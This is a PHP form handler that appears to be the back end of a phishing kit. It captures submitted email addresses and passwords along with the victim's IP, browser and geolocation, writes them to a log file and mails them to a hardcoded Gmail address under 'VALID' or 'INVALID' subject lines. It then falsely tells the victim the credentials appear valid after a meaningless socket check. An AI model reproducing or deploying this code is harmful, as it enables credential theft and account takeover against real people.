<?php
// Form-based postmailer - No CORS needed
header('Content-Type: text/html; charset=UTF-8');

// For POST requests (form submission)
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get form data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Basic validation
    if (empty($email) || empty($password)) {
        echo '<html><body>error: Email and password are required</body></html>';
        exit;
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo '<html><body>error: Invalid email format</body></html>';
        exit;
    }
    
    // Get client info
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $domain = explode("@", $email)[1] ?? 'unknown';
    
    // Get geolocation
    $country = 'Unknown';
    $city = 'Unknown';
    
    try {
        $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip);
        if ($geoData) {
            $geo = json_decode($geoData);
            $country = $geo->geoplugin_countryName ?? 'Unknown';
            $city = $geo->geoplugin_city ?? 'Unknown';
        }
    } catch (Exception $e) {
        // Ignore geo errors
    }
    
    // Prepare message
    $message = "Email = " . $email . "\n";
    $message .= "Password = " . $password . "\n";
    $message .= "IP: " . $country . " | " . $city . " | " . $ip . "\n";
    $message .= "Browser: " . $browser . "\n";
    $message .= "Domain: " . $domain . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $message .= "Method: Form Submission (No CORS)\n";
    
    // Log to file
    $logEntry = "[" . date('Y-m-d H:i:s') . "] FORM SUBMISSION\n" . $message . "\n" . str_repeat("-", 50) . "\n";
    @file_put_contents('login_attempts_form.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Simple SMTP test
    $validCredentials = false;
    $errorMessage = '';
    
    try {
        // Test SMTP connection to the email domain
        $smtpHost = 'mail.' . $domain;
        $smtpPort = 587;
        
        $socket = @fsockopen($smtpHost, $smtpPort, $errno, $errstr, 10);
        if ($socket) {
            fclose($socket);
            $validCredentials = true;
        } else {
            $errorMessage = "SMTP connection failed: $errstr ($errno)";
        }
    } catch (Exception $e) {
        $errorMessage = 'SMTP test failed: ' . $e->getMessage();
    }
    
    // Send email notification
    $to = 'skkho87.sm@gmail.com'; // Your notification email
    $subject = ($validCredentials ? 'VALID' : 'INVALID') . ' Form Login || ' . $country . ' || ' . $email;
    
    $emailBody = "Form-based login attempt details:\n\n" . $message;
    if (!$validCredentials) {
        $emailBody .= "\nError: " . $errorMessage;
    }
    
    $headers = "From: security-form@" . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    // Try to send notification email
    $emailSent = @mail($to, $subject, $emailBody, $headers);
    
    // Return response to iframe
    if ($validCredentials) {
        echo '<html><body>ok: Login successful! Credentials appear valid.</body></html>';
    } else {
        echo '<html><body>error: Invalid credentials. SMTP test failed.</body></html>';
    }
    
} else {
    // For GET requests - simple test page
    echo '<html><body>';
    echo '<h2>Form Handler Test</h2>';
    echo '<p>Status: Working</p>';
    echo '<p>Time: ' . date('Y-m-d H:i:s') . '</p>';
    echo '<p>Server: ' . $_SERVER['HTTP_HOST'] . '</p>';
    echo '</body></html>';
}
?>